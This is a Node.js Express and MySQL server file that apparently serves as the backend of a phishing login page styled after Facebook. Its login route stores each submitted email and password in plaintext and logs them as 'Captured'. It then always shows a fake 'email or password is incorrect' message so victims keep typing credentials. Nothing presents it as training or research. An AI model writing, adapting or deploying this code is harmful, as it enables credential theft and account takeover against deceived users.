const express = require("express");
const mysql = require("mysql2");
const bodyParser = require("body-parser");

const app = express();

// ── Middleware ─────────────────────────────────────────────
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // serve index.html & index.css

// ── MySQL Connection (works both locally and on Railway) ───
const db = mysql.createConnection({
    host:     process.env.MYSQLHOST     || "localhost",
    user:     process.env.MYSQLUSER     || "root",
    password: process.env.MYSQLPASSWORD || "",
    database: process.env.MYSQLDATABASE || "login_app",
    port:     process.env.MYSQLPORT     || 3306
});

db.connect(err => {
    if (err) {
        console.error("❌ MySQL connection failed:", err.message);
        console.error("👉 Make sure all MYSQL environment variables are set in Railway!");
        return; // don't crash, so you can still see the logs
    }
    console.log("✅ MySQL Connected!");

    // Auto-create the users table if it doesn't exist
    const createTable = `
        CREATE TABLE IF NOT EXISTS users (
            id         INT AUTO_INCREMENT PRIMARY KEY,
            email      VARCHAR(255) NOT NULL,
            password   VARCHAR(255) NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `;
    db.query(createTable, err => {
        if (err) {
            console.error("❌ Failed to create table:", err.message);
        } else {
            console.log("✅ 'users' table ready.");
        }
    });
});

// ── POST /login  →  save email + password to DB ────────────
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send("Email and password are required.");
    }

    const sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    db.query(sql, [email, password], (err, result) => {
        if (err) {
            console.error("❌ DB insert error:", err.message);
            return res.status(500).send("Something went wrong. Please try again.");
        }

        console.log(`📥 Captured → Email: ${email} | Row ID: ${result.insertId}`);

        // Show "wrong password" page after form submit
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Login failed</title>
              <style>
                body { font-family: Arial, sans-serif; display: flex; justify-content: center;
                       align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
                .box { background: white; padding: 30px 40px; border-radius: 8px;
                       box-shadow: 0 2px 12px rgba(0,0,0,.15); text-align: center; }
                p  { color: #606770; }
                a  { color: #1877f2; text-decoration: none; font-weight: 600; }
              </style>
            </head>
            <body>
              <div class="box">
                <h2 style="color:#d32f2f">The email or password is incorrect.</h2>
                <p>Please try again or <a href="/">go back</a>.</p>
              </div>
            </body>
            </html>
        `);
    });
});

// ── Start server ───────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running → http://localhost:${PORT}`);
});